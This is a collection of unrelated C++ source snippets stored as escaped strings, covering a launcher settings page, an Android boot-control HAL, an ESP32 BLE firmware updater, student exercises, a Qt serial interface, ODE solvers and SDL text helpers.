updateThresholds();\n}\n\nInstanceSettingsPage::~InstanceSettingsPage()\n{\n    delete ui;\n}\n\nvoid InstanceSettingsPage::globalSettingsButtonClicked(bool)\n{\n    switch (ui->settingsTabs->currentIndex()) {\n        case 0:\n            APPLICATION->ShowGlobalSettings(this, \"java-settings\");\n            return;\n        case 2:\n            APPLICATION->ShowGlobalSettings(this, \"custom-commands\");\n            return;\n        case 3:\n            APPLICATION->ShowGlobalSettings(this, \"environment-variables\");\n            return;\n        default:\n            APPLICATION->ShowGlobalSettings(this, \"minecraft-settings\");\n            return;\n    }\n}\n\nbool InstanceSettingsPage::apply()\n{\n    applySettings();\n    return true;\n}\n\nvoid InstanceSettingsPage::applySettings()\n{\n    SettingsObject::Lock lock(m_settings);\n\n    // Miscellaneous\n    bool miscellaneous = ui->miscellaneousSettingsBox->isChecked();\n    m_settings->set(\"OverrideMiscellaneous\", miscellaneous);\n    if (miscellaneous) {\n        m_settings->set(\"CloseAfterLaunch\", ui->closeAfterLaunchCheck->isChecked());\n        m_settings->set(\"QuitAfterGameStop\", ui->quitAfterGameStopCheck->isChecked());\n    } else {\n        m_settings->reset(\"CloseAfterLaunch\");\n        m_settings->reset(\"QuitAfterGameStop\");\n    }\n\n    // Console\n    bool console = ui->consoleSettingsBox->isChecked();\n    m_settings->set(\"OverrideConsole\", console);\n    if (console) {\n        m_settings->set(\"ShowConsole\", ui->showConsoleCheck->isChecked());\n        m_settings->set(\"AutoCloseConsole\", ui->autoCloseConsoleCheck->isChecked());\n        m_settings->set(\"ShowConsoleOnError\", ui->showConsoleErrorCheck->isChecked());\n    } else {\n        m_settings->reset(\"ShowConsole\");\n        m_settings->reset(\"AutoCloseConsole\");\n        m_settings->reset(\"ShowConsoleOnError\");\n    }\n\n    // Window Size\n    bool window = ui->windowSizeGroupBox->isChecked();\n    m_settings->set(\"OverrideWindow\", window);\n    if (window)",
    "/*\n * Copyright (C) 2019 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n#include <cstdint>\n#define LOG_TAG \"android.hardware.boot@1.2-mtkimpl\"\n\n#include <memory>\n\n#include <log/log.h>\n#include <android-base/logging.h>\n#include <bootloader_message/bootloader_message.h>\n\n#include \"BootControl.h\"\n#include \"boot_region_control_private.h\"\n#include \"boot_control_definition.h\"\n\nnamespace android {\nnamespace hardware {\nnamespace boot {\nnamespace V1_2 {\nnamespace implementation {\n\nusing ::android::hardware::boot::V1_0::CommandResult;\nusing namespace android::bootable;\n\nbool BootControl::Init() {\n    return impl_.Init();\n}\n\n// Methods from ::android::hardware::boot::V1_0::IBootControl follow.\nReturn<uint32_t> BootControl::getNumberSlots() {\n    return impl_.GetNumberSlots();\n}\n\nReturn<uint32_t> BootControl::getCurrentSlot() {\n    return impl_.GetCurrentSlot();\n}\n\nReturn<void> BootControl::clearAvbbctlFlag() {\n  std::string err;\n  std::string device = get_bootloader_message_blk_device(&err);\n  if (device.empty()) {\n    LOG(ERROR) << \"Could not find bootloader message block device: \" << err;\n    return Void();\n  }\n\n  bootloader_control boot_ctrl;\n  if (!LoadBootloaderControl(device, &boot_ctrl)) {\n    LOG(ERROR) << \"Failed to load bootloader control block\";\n    return Void();\n  }\n\n  uint32_t computed_crc32 = BootloaderControlLECRC(&boot_ctrl);\n  if (boot_ctrl.crc32_le == computed_crc32 &&  boot_ctrl.reserved1[0] == 1) {\n    boot_ctrl.reserved1[0] = 0;\n    LOG(INFO) << \"Clear avb boot control convert flag\";\n    UpdateAndSaveBootloaderControl(device, &boot_ctrl);\n  }\n  return Void();\n}\n\nReturn<void> BootControl::markBootSuccessful(markBootSuccessful_cb _hidl_cb) {\n    struct CommandResult cr;\n    if (impl_.MarkBootSuccessful()) {\n        cr.success = true;\n        cr.errMsg = \"Success\";\n        clearAvbbctlFlag();\n    } else {\n        cr.success = false;\n        cr.errMsg = \"Operation failed\";\n    }\n    _hidl_cb(cr);\n    return Void();\n}\n\nReturn<void> BootControl::setActiveBootSlot(uint32_t slot, setActiveBootSlot_cb _hidl_cb) {\n    struct CommandResult cr;\n    if (impl_.SetActiveBootSlot(slot) && implext_.SetBootRegionSlot(slot)) {\n        cr.success = true;\n        cr.errMsg = \"Success\";\n    } else {\n        cr.success = false;\n        cr.errMsg = \"Operation failed\";\n    }\n    _hidl_cb(cr);\n    return Void();\n}\n\nReturn<void> BootControl::setSlotAsUnbootable(uint32_t slot, setSlotAsUnbootable_cb _hidl_cb) {\n    struct CommandResult cr;\n    if (impl_.SetSlotAsUnbootable(slot)) {\n        cr.success = true;\n        cr.errMsg = \"Success\";\n    } else {\n        cr.success = false;\n        cr.errMsg = \"Operation failed\";\n    }\n    _hidl_cb(cr);\n    return Void();\n}\n\nReturn<BoolResult> BootControl::isSlotBootable(uint32_t slot) {\n    if (!impl_.IsValidSlot(slot)) {\n        return BoolResult::INVALID_SLOT;\n    }\n    return impl_.IsSlotBootable(slot) ? BoolResult::TRUE : BoolResult::FALSE;\n}\n\nReturn<BoolResult> BootControl::isSlotMarkedSuccessful(uint32_t slot) {\n    if (!impl_.IsValidSlot(slot)) {\n        return BoolResult::INVALID_SLOT;\n    }\n    return impl_.IsSlotMarkedSuccessful(slot) ? BoolResult::TRUE : BoolResult::FALSE;\n}\n\nReturn<void> BootControl::getSuffix(uint32_t slot, getSuffix_cb _hidl_cb) {\n    hidl_string ans;\n    const char* suffix = impl_.GetSuffix(slot);\n    if (suffix) {\n        ans = suffix;\n    }\n    _hidl_cb(ans);\n    return Void();\n}\n\nReturn<bool> BootControl::setSnapshotMergeStatus(MergeStatus status) {\n    return impl_.SetSnapshotMergeStatus(status);\n}\n\nReturn<MergeStatus> BootControl::getSnapshotMergeStatus() {\n    return impl_.GetSnapshotMergeStatus();\n}\n\n// Methods from ::android::hardware::boot::V1_2::IBootControl follow.\nReturn<uint32_t> BootControl::getActiveBootSlot() {\n    if (!impl_.GetActiveBootSlot()) return 0;\n    return impl_.GetActiveBootSlot();\n}\n\nIBootControl* HIDL_FETCH_IBootControl(const char* /* hal */) {\n    auto module = std::make_unique<BootControl>();\n    if (!module->Init()) {\n        ALOGE(\"Could not initialize BootControl module\");\n        return nullptr;\n    }\n    return module.release();\n}\n\n}  // namespace implementation\n}  // namespace V1_2\n}  // namespace boot\n}  // namespace hardware\n}  // namespace android\n",
    "\ufeff#include \"iostream\"\n#include \"fstream\"\nusing namespace std;\n\nconst int MAX = 20;\n\nstruct maTrix {\n\tint maTranKe[MAX][MAX];\n\tint soDinh;\n};\n\nvoid readFile(maTrix& mtk) {\n\tifstream inFile(\"Text.txt\");\n\tif (!inFile.is_open()) {\n\t\tcout << \"\\nKhong the mo tep\";\n\t\treturn;\n\t}\n\n\tinFile >> mtk.soDinh;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tfor (int j = 0; j < mtk.soDinh; j++) {\n\t\t\tinFile >> mtk.maTranKe[i][j];\n\t\t}\n\t}\n\tinFile.close();\n}\n\nvoid outputMaTrix(maTrix mtk) {\n\tcout << \"\\nMA TRAN KE: \" << endl;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tfor (int j = 0; j < mtk.soDinh; j++) {\n\t\t\tcout << mtk.maTranKe[i][j] << \"\\t\";\n\t\t}\n\t\tcout << endl;\n\t}\n}\n\n//  H\u00e0m tr\u1ea3 v\u1ec1 s\u1ed1 c\u1ea1nh c\u1ee7a \u0111\u1ed3 th\u1ecb\nint soCanhDoThi(maTrix mtk) {\n\tint tongSoCanh = 0;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tfor (int j = 0; j < mtk.soDinh; j++) {\n\t\t\tif (mtk.maTranKe[i][j] != 0)\n\t\t\t\ttongSoCanh++;\n\t\t}\n\t}\n\treturn tongSoCanh;\n}\n\n// T\u00ednh b\u1eadc ra c\u1ee7a \u0111\u1ed3 th\u1ecb \nint outDeg(maTrix mtk, int dinhU) {\n\tint soBacRa = 0;\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tif (mtk.maTranKe[dinhU][i] != 0)\n\t\t\tsoBacRa++;\n\t}\n\treturn soBacRa;\n}\n\n// Cho \u0111\u1ec9nh u, t\u00ecm \u0111\u1ec9nh v sao cho c\u1ea1nh (u,v) c\u00f3 tr\u1ecdng s\u1ed1 l\u1edbn nh\u1ea5t \nbool canhLonNhat(maTrix mtk, int dinhU, int& dinhV) {\n\tfor (int i = 0; i < mtk.soDinh; i++) {\n\t\tif (mtk.maTranKe[dinhU][i] > mtk.maTranKe[dinhU][dinhV])\n\t\t\tdinhV = i;\n\t}\n\treturn true;\n}\n\nint main() {\n\tmaTrix mtk;\n\treadFile(mtk);\n\toutputMaTrix(mtk);\n\n\treturn 0;\n}",
    "#include <BLEDevice.h>\n#include <BLEServer.h>\n#include <BLEUtils.h>\n#include <BLE2902.h>\n#include \"soc/soc.h\"\n#include \"soc/rtc_cntl_reg.h\"\n\n#include <Update.h>\n\n#include <ArduinoJson.h>\n\n#include <LittleFS.h>\n\n#include <OTA_Update_.h>\n\n\n// Callback for handling data received on the RX characteristic\nint SEGMENT = 0;\nint FULL_PACKAGE = 0;\nint SIZE_OTA = 0;\nbool isUpdate = false;\nString msg_status = \"\";\nbool status_update = false;\n\n// Define the BLE Service and Characteristics\nBLEServer* pServer = NULL;\nBLECharacteristic* pCharacteristicRX = NULL;\nBLECharacteristic* pCharacteristicTX = NULL;\n\n// Characteristic UUIDs\nstatic BLEUUID serviceUUID(\"4fafc201-1fb5-459e-8fcc-c5c9c331914b\");\nstatic BLEUUID charUUID_RX(\"beb5483e-36e1-4688-b7f5-ea07361b26a8\");\nstatic BLEUUID charUUID_TX(\"e32d6400-0a1c-43af-a591-8634cc4b7af4\");\n\nbool deviceConnected = false;\nbool oldDeviceConnected = false;\n\n// Callback for receiving data from the central device\nclass MyServerCallbacks : public BLEServerCallbacks {\n    void onConnect(BLEServer* pServer) {\n        deviceConnected = true;\n    }\n\n    void onDisconnect(BLEServer* pServer) {\n        deviceConnected = false;\n        isUpdate = false;\n        ESP.restart();\n    }\n};\n\nconst String generateJsonString() {\n    DynamicJsonDocument jsonDoc(256);\n    jsonDoc[\"Segment\"] = SEGMENT;\n    jsonDoc[\"ota_size\"] = SIZE_OTA;\n    jsonDoc[\"msg_status\"] = msg_status;\n    jsonDoc[\"Total_byte\"] = LittleFS.totalBytes();\n    jsonDoc[\"Use_byte\"] = LittleFS.usedBytes();\n\n    String jsonString;\n    serializeJson(jsonDoc, jsonString);\n    return jsonString;\n}\n\nvoid performUpdate(Stream &updateSource, size_t updateSize) {\n  if (Update.begin(updateSize)) {\n    size_t written = Update.writeStream(updateSource);\n    if (written == updateSize) {\n      Serial.println(\"Written : \" + String(written) + \" successfully\");\n    }\n    else {\n      Serial.println(\"Written only : \" + String(written) + \"/\" + String(updateSize) + \". Retry?\");\n    }\n    msg_status = \"Written : \" + String(written) + \"/\" + String(updateSize) + \" [\" + String((written / updateSize) * 100) + \"%] \\n\";\n    if (Update.end()) {\n      Serial.println(\"OTA done!\");\n      msg_status = \"OTA Done: \";\n      if (Update.isFinished()) {\n        Serial.println(\"Update successfully completed. Rebooting...\");\n        status_update = true;\n        msg_status = \"Success!\\n\";\n      }\n      else {\n        Serial.println(\"Update not finished? Something went wrong!\");\n        msg_status = \"Failed!\\n\";\n      }\n\n    }\n    else {\n      Serial.println(\"Error Occurred. Error #: \" + String(Update.getError()));\n      msg_status = \"Error #: \" + String(Update.getError());\n    }\n  }\n  else\n  {\n    Serial.println(\"Not enough space to begin OTA\");\n    msg_status = \"Not enough space for OTA\";\n  }\n}\n\nvoid updateFromFS(fs::FS &fs) {\n  File updateBin = fs.open(\"/firmware.bin\");\n  if (updateBin) {\n    if (updateBin.isDirectory()) {\n      Serial.println(\"Error, update.bin is not a file\");\n      updateBin.close();\n      return;\n    }\n\n    size_t updateSize = updateBin.size();\n\n    if (updateSize > 0) {\n      Serial.println(\"Trying to start update\");\n      performUpdate(updateBin, updateSize);\n    }\n    else {\n      Serial.println(\"Error, file is empty\");\n    }\n\n    updateBin.close();\n\n    // when finished remove the binary from spiffs to indicate end of the process\n    Serial.println(\"Removing update file\");\n    fs.remove(\"/firmware.bin\");\n  }\n  else {\n    Serial.println(\"Could not load update.bin from spiffs root\");\n  }\n}\n\nclass MyCallbacks : public BLECharacteristicCallbacks {\n  void onWrite(BLECharacteristic *pCharacteristic) {\n    std::string rxValue = pCharacteristic->getValue();\n    int len = rxValue.length();\n    uint8_t* data = pCharacteristic->getData();\n\n    if (deviceConnected) {\n      if (SEGMENT > 0) {\n        File file = LittleFS.open(\"/firmware.bin\", \"ab\");  // Open file in append mode\n        if (!file) {\n          Serial.println(\"Failed to open file for writing\");\n          return;\n        }\n        //\n        isUpdate = true;\n\n        size_t bytesWritten = file.write(data, len);  // Use write method to write binary data\n        if (bytesWritten == len) {\n          // Print a message indicating successful data write\n          msg_status = \"Data written successfully\";\n          Serial.print(\"Data written successfully: \");\n          for (int i = 0; i < len; i++) {\n            Serial.print(data[i], HEX);\n            Serial.print(' '); // Add a space between hex values for better readability\n          }\n          Serial.println();\n\n        } else {\n          Serial.println(\"Write failed\");\n          msg_status = \"Data written successfully\";\n        }\n\n        file.close();\n\n        SIZE_OTA += len;  // Use 'len' instead of 'rxValue.length()'\n\n        if (FULL_PACKAGE == SIZE_OTA) {\n         // Print OTA success message\n          Serial.println(\"OTA SUCCESS\");\n\n          updateFromFS(LittleFS);\n\n          // Open the file for reading to get the file size\n          File read",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n#define MAX 10\r\n\r\nstruct node {\r\n    int id;\r\n    string name, history, disease, t_plan[MAX];\r\n};\r\n\r\nclass HashTable {\r\n    node p[MAX];\r\n\r\npublic:\r\n    HashTable() {\r\n      \r\n        for (int i = 0; i < MAX; i++) {\r\n            p[i].id = -1;\r\n        }\r\n    }\r\n\r\n    void insert();\r\n    void search(int id);\r\n    void deleter(int id);\r\n    void display();\r\n};\r\n\r\nvoid HashTable::insert() {\r\n    node newPatient;\r\n    cout<<\"Max 10 records can be inserted \\n\";\r\n\r\n    cout << \"Enter the patient id: \";\r\n    cin >> newPatient.id;\r\n\r\n    cout << \"Enter the Patient Name: \";\r\n    cin >> newPatient.name;\r\n\r\n    cout << \"Enter the medical history of patient: \";\r\n    cin >> newPatient.history;\r\n\r\n    cout << \"Enter the disease of the patient: \";\r\n    cin >> newPatient.disease;\r\n\r\n    cout << \"Enter the treatment plan for the patient: \";\r\n    cin >> newPatient.t_plan[0]; \r\n\r\n    int b = newPatient.id % MAX;\r\n\r\n    while (p[b].id != -1) {\r\n        cout << \"Collision occurred at position \" << b << \". \";\r\n        b = (b + 1) % MAX; \r\n    }\r\n\r\n    p[b] = newPatient; \r\n    cout << \"Patient \" << newPatient.name << \" inserted at position \" << b << \".\" << endl;\r\n}\r\n\r\nvoid HashTable::search(int id) {\r\n    int b = id % MAX;\r\n    int initial_b = b;\r\n\r\n\r\n    while (p[b].id != id && p[b].id != -1) {\r\n        b = (b + 1) % MAX;\r\n\r\n        if (b == initial_b) {\r\n            cout << \"Patient with ID \" << id << \" not found.\" << endl;\r\n            return;\r\n        }\r\n    }\r\n\r\n    if (p[b].id == id) {\r\n        cout << \"Patient found at position \" << b << \":\" << endl;\r\n        cout << \"ID: \" << p[b].id << endl;\r\n        cout << \"Name: \" << p[b].name << endl;\r\n        cout << \"Disease: \" << p[b].disease << endl;\r\n        cout << \"History: \" << p[b].history << endl;\r\n        cout << \"Treatment Plan: \" << p[b].t_plan[0] << endl;\r\n    } else {\r\n        cout << \"Patient with ID \" << id << \" not found.\" << endl;\r\n    }\r\n}\r\n\r\nvoid HashTable::deleter(int id) {\r\n    int b = id % MAX;\r\n    int initial_b = b;\r\n\r\n    while (p[b].id != id && p[b].id != -1) {\r\n        b = (b + 1) % MAX;\r\n       \r\n        if (b == initial_b) {\r\n            cout << \"Patient with ID \" << id << \" not found.\" << endl;\r\n            return;\r\n        }\r\n    }\r\n\r\n    if (p[b].id == id) {\r\n        p[b].id = -1; \r\n        cout << \"Patient with ID \" << id << \" deleted successfully.\" << endl;\r\n    } else {\r\n        cout << \"Patient with ID \" << id << \" not found.\" << endl;\r\n    }\r\n}\r\n\r\nvoid HashTable::display() {\r\n    cout << \"\\nPatients in the Hash Table:\" << endl;\r\n    cout << \"Index\\tID\\tName\\tDisease\\tHistory\\tTreatment Plan\" << endl;\r\n    for (int i = 0; i < MAX; i++) {\r\n        if (p[i].id != -1) {\r\n            cout << i << \"\\t\" << p[i].id << \"\\t\" << p[i].name << \"\\t\" << p[i].disease << \"\\t\" << p[i].history << \"\\t\" << p[i].t_plan[0] << endl;\r\n        } else {\r\n            cout << i << \"\\tEMPTY\" << endl; \r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    HashTable h;\r\n    int choice, id;\r\n\r\n    do {\r\n        cout << \"\\n1. Insert a Patient\" << endl;\r\n        cout << \"2. Search for a Patient\" << endl;\r\n        cout << \"3. Delete a Patient\" << endl;\r\n        cout << \"4. Display all Patients\" << endl;\r\n        cout << \"5. Exit\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                h.insert();\r\n                break;\r\n            case 2:\r\n                cout << \"Enter the ID of the patient you want to search: \";\r\n                cin >> id;\r\n                h.search(id);\r\n                break;\r\n            case 3:\r\n                cout << \"Enter the ID of the patient you want to delete: \";\r\n                cin >> id;\r\n                h.deleter(id);\r\n                break;\r\n            case 4:\r\n                h.display();\r\n                break;\r\n            case 5:\r\n                cout << \"Exiting...\" << endl;\r\n                break;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\" << endl;\r\n        }\r\n    } while (choice != 5);\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <cmath>\n#include <QTime>\n#include <QTimer>\n#include <qmessagebox.h>\n#include <QtSerialPort/QSerialPort>\n#include <QtSerialPort/QSerialPortInfo>\n#include <QString>\n#include <QByteArray>\n#include <QDebug>\n#include <QFile>\n#include <QTextStream>\n#include <QCryptographicHash>\n#include \"User.h\"\n#include \"ultrasonicsensor.h\"\n#include <QThread>\n#ifdef __linux__\n#include <pigpio.h>\n#endif\n\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n\n    ringTx.buf=TX;\n    ringRx.buf=RX;\n    ringTx.iW=0;\n    ringTx.iR=0;\n    ringRx.iW=0;\n    ringRx.iR=0;\n    ringRx.header=0;\n\n    timerUSB = new QTimer(this);\n    connect(timerUSB, &QTimer::timeout, this, &MainWindow::verificarYConectarUSB);\n    timerUSB->start(1000); // Intervalo de tiempo en milisegundos\n\n    ALIVEHMI = new QTimer(this);\n    connect(ALIVEHMI, &QTimer::timeout, this, &MainWindow::AliveHMI);\n    ALIVEHMI->start(1); // Intervalo de tiempo en milisegundos\n\n    serial = new QSerialPort(this);\n    /*//serial->setPortName(\"COM4\"); // Ajusta el nombre del puerto a tu puerto correcto.\n        serial->setPortName(\"COM12\");\n        serial->setBaudRate(QSerialPort::Baud9600);\n        serial->open(QSerialPort::ReadWrite);\n        serial->setDataTerminalReady(true);\n        connect(serial, &QSerialPort::readyRead, this, &MainWindow::OnQSerialPort1Rx);*/\n    conectarMicro();\n    //connect(serial, &QSerialPort::readyRead, this, &MainWindow::OnQSerialPort1Rx);\n\n    // Setup sensor\n    UltrasonicSensor *sensor = new UltrasonicSensor(18, 24); // Aseg\u00farate de ajustar los pines\n\n    QThread *sensorThread = new QThread(this);\n    sensor->moveToThread(sensorThread);\n\n    connect(sensorThread, &QThread::finished, sensor, &QObject::deleteLater);\n    connect(this, &MainWindow::startMeasurement, sensor, &UltrasonicSensor::measureDistance);\n    //connect(sensor, &UltrasonicSensor::distanceMeasured, this, &MainWindow::updateDistanceLabel);\n    connect(sensor, &UltrasonicSensor::distanceMeasured, this, &MainWindow::updateDistance);\n\n    sensorThread->start();\n    emit startMeasurement(); // Puedes llamarlo en un temporizador si necesitas mediciones continuas\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n\n    sensorThread->quit();\n    sensorThread->wait();\n    delete sensorThread; // sensor se borrar\u00e1 autom\u00e1ticamente debido a deleteLater\n    #ifdef __linux__\n        gpioTerminate(); // Limpieza de la biblioteca pigpio\n    #endif\n}\n\nvoid MainWindow::conectarMicro(){\n    // Enumerar los puertos disponibles y buscar tu dispositivo espec\u00edfico\n    foreach(const QSerialPortInfo &info, QSerialPortInfo::availablePorts()) {\n        if (((info.description().contains(\"USB Serial Device\")) || (info.description().contains(\"VCOM\")) || (info.description().contains(\"Dispositivo serie USB\"))) && (info.serialNumber() == \"\")) {\n            serial->setPort(info);\n            serial->setBaudRate(QSerialPort::Baud115200); // Configura seg\u00fan tu dispositivo\n            // Configura otros par\u00e1metros si es necesario\n\n            if (serial->open(QSerialPort::ReadWrite)) {\n                serial->setDataTerminalReady(true);\n                qDebug() << \"Conectado con \u00e9xito a\" << info.portName();\n                                                       connect(serial, &QSerialPort::readyRead, this, &MainWindow::OnQSerialPort1Rx);\n                break; // Salir del bucle una vez conectado\n            } else {\n                qDebug() << \"Error al abrir el puerto:\" << serial->errorString();\n            }\n        }\n    }\n}\n\nvoid MainWindow::AliveHMI() {\n    static uint16_t counter = 0;\n\n    counter ++;\n    if (counter >= 25 && serial->isOpen()) {\n        crearArrayCMD(HMI_ALIVE_CMD,0);\n        EnviarComando(0x0B,HMI_ALIVE_CMD,payloadCAN);\n        counter = 0;\n    }\n\n}\n\nvoid MainWindow::verificarYConectarUSB() {\n\n    if (serial->isOpen()) {\n        // El dispositivo ya est\u00e1 conectado, no es necesario hacer nada.\n        qDebug() << \"Dispositivo ya conectado.\";\n\n    } else {\n        // Intentar reconectar\n        qDebug() << \"Dispositivo desconectado. Intentando reconectar...\";\n        conectarMicro();\n    }\n    if (!serial->isOpen() || serial->error() == QSerialPort::ResourceError) {\n        qDebug() << \"Problema detectado en la conexi\u00f3n. Intentando reconectar...\";\n                    serial->close(); // Cierra el puerto si est\u00e1 abierto\n        conectarMicro(); // Intenta reconectar\n    }\n}\n\nvoid MainWindow::OnQSerialPort1Rx(){\n\n    QByteArray data = serial->readAll();\n    if (data.isEmpty()) {\n        return;\n    }\n\n    QString strhex;\n    for (int i = 0; i < data.size(); i++)\n        strhex = strhex + QString(\"%1\").arg(static_cast<quint8>(data[i]), 2, 16, QChar('0')).toUpper();\n\n    //strData = QString::fromLatin1(data);\n\n    for (int i = 0; i < data.size(); i++)\n    {\n        ringRx.buf[ringRx.iW] = data[i];\n        ringRx.iW++;\n        Decode();\n    }\n\n    //ui->LINE_POS->setText(strhex);\n",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <iomanip>\n\nstd::vector<double> operator*(double scalar, const std::vector<double> &v) {\n    std::vector<double> result(v.size());\n    for (int i = 0; i < v.size(); i++) {\n        result[i] = v[i] * scalar;\n    }\n    return result;\n}\n\nstd::vector<double> operator+(const std::vector<double> &v1, const std::vector<double> &v2) {\n    std::vector<double> result(v1.size());\n    for (int i = 0; i < v1.size(); i++) {\n        result[i] = v1[i] + v2[i];\n    }\n    return result;\n}\n\nstd::vector<double> F(double x, const std::vector<double> &y) {\n    std::vector<double> f(2);\n    f[0] = std::cos(-1 + x + y[0] + 3 * y[1]);\n    f[1] = -y[0] * y[0] + 2 * std::sin(y[1]);\n    return f;\n}\n\nvoid Euler(double n, std::vector<double> (*func)(double, const std::vector<double> &), std::vector<double> &a, double x0, double xEnd, double accuracy, int eq) {\n    std::vector<std::vector<double>> container;\n    std::cout << std::setw(2)  << \"i\"; \n    std::cout << std::setw(15) << \"A(h_i)\";\n    std::cout << std::setw(20) << \"A(h_(i-1))-A(h_i)\"; \n    std::cout << std::setw(15) << \"alpha_k\";\n    std::cout << std::setw(15) << \"rich-error\"; \n    std::cout << std::setw(15) << \"order\";\n    std::cout << std::setw(10) << \"n\";\n    std::cout << std::endl;\n\n    double prev_prev_integral = 0.0;\n    double prev_integral = 0.0;\n    for (int i = 0; i < 50; i++) {\n        std::vector<double> yn = a;\n        double h = (xEnd - x0) / n;\n        for (int j = 0; j < n; j++) {\n            yn = yn + h * func(x0 + j * h, yn);\n        }\n        \n        container.push_back(yn);\n\n        double integral = container[i][eq];\n        std::cout << std::setw(2) << i << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson;\n                std::cout << std::setw(15) << std::log2(diff1 / diff);\n                if (std::abs(richardson) < accuracy) {\n                    std::cout << std::setw(10) << n << std::endl;\n                    std::cout << std::endl;\n                    break;\n                }\n            } else {\n                std::cout << std::setw(45) << \" \";\n            }\n        } else {\n            std::cout << std::setw(65) << \" \";\n        }\n        std::cout << std::setw(10) << n;\n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n        n *= 2;\n    }\n    std::cout << std::endl;\n}\n\nvoid Midpoint(double n, std::vector<double> (*func)(double, const std::vector<double> &), std::vector<double> &a, double x0, double xEnd, double accuracy, int eq) {\n    std::vector<std::vector<double>> container;\n    std::cout << std::setw(2)  << \"i\"; \n    std::cout << std::setw(15) << \"A(h_i)\";\n    std::cout << std::setw(20) << \"A(h_(i-1))-A(h_i)\"; \n    std::cout << std::setw(15) << \"alpha_k\";\n    std::cout << std::setw(15) << \"rich-error\"; \n    std::cout << std::setw(15) << \"order\";\n    std::cout << std::setw(10) << \"n\";\n    std::cout << std::endl;\n\n    double prev_prev_integral = 0.0;\n    double prev_integral = 0.0;\n    for (int i = 0; i < 50; i++) {\n        std::vector<double> yn = a;\n        double h = (xEnd - x0) / n;\n        for (int j = 0; j < n; j++) {\n            std::vector<double> k1 = func(x0 + j * h, yn);\n            std::vector<double> k2 = func(x0 + j * h + h * 0.5, yn + 0.5 * h * k1);\n            yn = yn + h * k2;\n        }\n        \n        container.push_back(yn);\n\n        double integral = container[i][eq];\n        std::cout << std::setw(2) << i << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson;\n                std::cout << std::setw(15) << std::log2(diff1 / diff);\n                if (std::abs(richardson) < accuracy) {\n                    std::cout << std::setw(10) << n << std::endl;\n                    std::cout << std::endl;\n                    break;\n                }\n            } else {\n                std::cout << std::setw(45) << \" \";\n            }\n        } else {\n            std::cout << std::setw(65) << \" \";\n        }\n        std::cout << std::setw(10) << n;\n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n        n",
    "#include <SDL2/SDL.h>\n#include <SDL2/SDL_ttf.h>\n#include <iostream>\n#include <cstring>\n\nvoid drawText(const std::string &text, TTF_Font *font, SDL_Renderer *screen, int x, int y, const SDL_Color &color)\n{\n\tSDL_Surface *textSurface = TTF_RenderText_Blended(font, text.c_str(), color);\n\tSDL_Texture *texture = SDL_CreateTextureFromSurface(screen, textSurface);\n\tSDL_Rect dstRect = {x, y, textSurface->w, textSurface->h};\n\tSDL_RenderCopy(screen, texture, NULL, &dstRect);\n\tSDL_FreeSurface(textSurface);\n\tSDL_DestroyTexture(texture);\n}\n\nvoid drawTextWrapped(const std::string &text, TTF_Font *font, SDL_Renderer *screen, int x, int y, int width, const SDL_Color &color)\n{\n\tSDL_Surface *textSurface = TTF_RenderText_Blended_Wrapped(font, text.c_str(), color, width);\n\tSDL_Texture *texture = SDL_CreateTextureFromSurface(screen, textSurface);\n\tSDL_Rect dstRect = {x, y, textSurface->w, textSurface->h};\n\tSDL_RenderCopy(screen, texture, NULL, &dstRect);\n\tSDL_FreeSurface(textSurface);\n\tSDL_DestroyTexture(texture);\n}\n\nvoid drawTextCentered(const std::string &text, TTF_Font *font, SDL_Renderer *screen, int x, int y, int width, const SDL_Color &color)\n{\n\tint textWidth, textHeight;\n\tTTF_SizeText(font, text.c_str(), &textWidth, &textHeight);\n\tdrawText(text, font, screen, x + (width - textWidth) / 2, y, color);\n}",
